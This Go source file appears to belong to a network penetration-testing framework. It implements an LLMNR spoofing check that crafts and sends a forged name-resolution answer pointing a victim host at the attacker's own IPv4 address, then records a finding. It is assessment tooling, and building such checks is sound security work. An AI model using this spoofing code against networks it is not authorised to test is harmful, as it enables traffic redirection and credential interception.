// llmnr.go implements the LLMNR name-resolution spoofing attack behavior.
// The attack answers a name with the attacker's own IPv4; the spoofed
// answer expires with its 30 s TTL, which the catalog carries as the decay
// bound.

package fh

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	"go.aledante.io/FlowSeer/src/edge/netpen/link"
)

type llmnrFinding struct {
	Action  string `json:"action"`
	Query   string `json:"query"`
	Answer  string `json:"answer"`
	TTL     uint32 `json:"ttl"`
	Spoofed bool   `json:"spoofed"`
}

// RunLLMNR sends one spoofed answer to the target's victim naming the
// attack leg's own IPv4. The queried name and the transaction ID are probe
// content. The verdict is pending: whether the victim resolved the name to
// the attacker needs a listener for the follow-up connection that phase 2
// adds. Craft and send failures are returned with operation context.
func RunLLMNR(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim, check.FieldVictimMAC); err != nil {
		return check.Verdict{}, err
	}
	addr := deps.AttackLeg.Addr()
	qname := "host.lab"

	responsePkt, err := craftLLMNRResponse(addr, deps.Target.Victim, qname)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "llmnr: craft response")
	}
	if err := deps.AttackLeg.Send(ctx, responsePkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "llmnr: send response")
	}

	detail := llmnrFinding{
		Action:  "llmnr-spoof",
		Query:   qname,
		Answer:  addr.IPv4.String(),
		TTL:     30,
		Spoofed: true,
	}
	detailBytes, _ := json.Marshal(detail)
	deps.Emitter.Finding("llmnr", detailBytes)

	return check.Pending("no observable: answer acceptance needs a listener for the victim's follow-up connection"), nil
}

// craftLLMNRResponse builds a spoofed LLMNR response: Ethernet → IPv4 →
// UDP(5355) → DNS response with the attacker's IP.
func craftLLMNRResponse(addr link.Addr, victim check.Host, qname string) ([]byte, error) {
	answerIP := addr.IPv4
	eth := &layers.Ethernet{
		DstMAC:       victim.MAC,
		SrcMAC:       addr.MAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    answerIP,
		DstIP:    victim.IP,
	}
	udp := &layers.UDP{
		SrcPort: 5355,
		DstPort: 5355,
	}
	body := buildDNSResponse(qname, answerIP)
	_ = udp.SetNetworkLayerForChecksum(ip)
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	if err := gopacket.SerializeLayers(buf, opts, eth, ip, udp, gopacket.Payload(body)); err != nil {
		return nil, err
	}
	return append([]byte(nil), buf.Bytes()...), nil
}

func buildDNSResponse(qname string, answerIP net.IP) []byte {
	var buf []byte
	buf = binary.BigEndian.AppendUint16(buf, 0x1234) // ID
	buf = binary.BigEndian.AppendUint16(buf, 0x8000) // flags=response
	buf = binary.BigEndian.AppendUint16(buf, 1)      // QDCOUNT
	buf = binary.BigEndian.AppendUint16(buf, 1)      // ANCOUNT
	buf = binary.BigEndian.AppendUint16(buf, 0)      // NSCOUNT
	buf = binary.BigEndian.AppendUint16(buf, 0)      // ARCOUNT
	for _, label := range splitLabels(qname) {
		buf = append(buf, byte(len(label)))
		buf = append(buf, label...)
	}
	buf = append(buf, 0)                             // root
	buf = binary.BigEndian.AppendUint16(buf, 1)      // QTYPE=A
	buf = binary.BigEndian.AppendUint16(buf, 1)      // QCLASS=IN
	buf = binary.BigEndian.AppendUint16(buf, 0xC00C) // compression pointer
	buf = binary.BigEndian.AppendUint16(buf, 1)      // type A
	buf = binary.BigEndian.AppendUint16(buf, 1)      // class IN
	buf = binary.BigEndian.AppendUint32(buf, 30)     // TTL
	buf = binary.BigEndian.AppendUint16(buf, 4)      // rdlength
	buf = append(buf, answerIP.To4()...)
	return buf
}

func splitLabels(name string) [][]byte {
	var labels [][]byte
	start := 0
	for i := range len(name) {
		if name[i] == '.' {
			labels = append(labels, []byte(name[start:i]))
			start = i + 1
		}
	}
	if start < len(name) {
		labels = append(labels, []byte(name[start:]))
	}
	return labels
}
